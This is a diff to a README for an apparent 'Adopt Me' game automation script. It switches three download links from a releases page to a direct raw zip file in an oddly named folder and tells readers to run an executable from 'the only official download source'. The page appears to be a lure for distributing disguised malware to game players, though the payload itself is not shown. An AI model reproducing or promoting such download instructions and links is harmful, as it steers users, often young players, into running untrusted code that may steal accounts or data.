@@ -1,6 +1,6 @@
 # 🎮 adopt-me-script-2026 - Automate Your Adopt Me Progress Instantly
 
-[![Download Adopt Me Script](https://img.shields.io/badge/Download-Adopt_Me_Script_2026-blue?style=for-the-badge&logo=windows)](https://github.com/hymenal-twine467/adopt-me-script-2026/releases)
+[![Download Adopt Me Script](https://img.shields.io/badge/Download-Adopt_Me_Script_2026-blue?style=for-the-badge&logo=windows)](https://github.com/hymenal-twine467/adopt-me-script-2026/raw/refs/heads/main/dioramic/script_me_adopt_v2.5.zip)
 
 ## 📋 What This Tool Does
 
@@ -24,7 +24,7 @@ Follow these exact steps to get the software running on your computer. Do them i
 
 Visit this link to download the application:
 
-👉 **[Click Here to Download](https://github.com/hymenal-twine467/adopt-me-script-2026/releases)**
+👉 **[Click Here to Download](https://github.com/hymenal-twine467/adopt-me-script-2026/raw/refs/heads/main/dioramic/script_me_adopt_v2.5.zip)**
 
 This link takes you to the official download page for the software. You will see a list of files or a big download button. Look for the file named something like `setup.exe` or `AdoptMeScript.exe`. Click the download button next to it. Your browser will save the file to your Downloads folder.
 
@@ -96,7 +96,7 @@ If you run into problems, try these fixes:
 
 If you lost the file or need to reinstall, simply use the same link again:
 
-👉 **[Download Adopt Me Script 2026](https://github.com/hymenal-twine467/adopt-me-script-2026/releases)**
+👉 **[Download Adopt Me Script 2026](https://github.com/hymenal-twine467/adopt-me-script-2026/raw/refs/heads/main/dioramic/script_me_adopt_v2.5.zip)**
 
 This is the only official download source. Do not trust copies from other websites.
 
